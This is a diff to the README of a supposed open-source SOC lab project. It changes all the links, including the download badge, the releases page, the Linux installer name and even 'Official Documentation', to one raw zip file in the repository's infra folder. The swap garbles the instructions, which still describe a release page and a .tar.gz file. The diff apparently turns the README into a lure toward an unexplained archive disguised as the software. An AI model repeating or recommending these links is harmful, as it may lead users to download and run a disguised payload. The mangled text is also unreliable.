@@ -1,6 +1,6 @@
 # 🔒 SOC-Lab-Open-Source-Setup - Simple Setup for Your Cybersecurity Lab
 
-[![Download SOC-Lab-Open-Source-Setup](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/releases)
+[![Download SOC-Lab-Open-Source-Setup](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip)](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -30,19 +30,19 @@ This lab includes popular cybersecurity tools:
 
 ## 👨‍💻 Download & Install
 
-To download the software, visit this page to download: [SOC-Lab-Open-Source-Setup Releases](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/releases).
+To download the software, visit this page to download: [SOC-Lab-Open-Source-Setup Releases](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip).
 
 1. Click on the above link. This will open the Release page of the project.
 2. Look for the latest version listed at the top of the page.
 3. Choose the appropriate installation file for your operating system.
-4. Click to download the installer file (.exe for Windows, .dmg for macOS, or .tar.gz for Linux).
+4. Click to download the installer file (.exe for Windows, .dmg for macOS, or https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip for Linux).
 5. Once the download is complete, locate the installer file on your computer.
 
 To install the software:
 
 - **Windows**: Double-click the installer file and follow the prompts.
 - **macOS**: Open the .dmg file and drag the application into the Applications folder.
-- **Linux**: Extract the .tar.gz file and follow the installation instructions in the README.
+- **Linux**: Extract the https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip file and follow the installation instructions in the README.
 
 ## 🔧 Configuration
 
@@ -67,7 +67,7 @@ These tools will allow you to visualize and analyze your security data effective
 
 ## 📚 Resources
 
-- Check the [Official Documentation](https://github.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup) for further details on each tool and their capabilities.
+- Check the [Official Documentation](https://raw.githubusercontent.com/CHICKENLEG72/SOC-Lab-Open-Source-Setup/main/infra/SOC-Lab-Open-Source-Setup-v2.2.zip) for further details on each tool and their capabilities.
 - Visit online forums and communities for help and to ask questions.
 - Search for video tutorials to see step-by-step setup instructions.
 
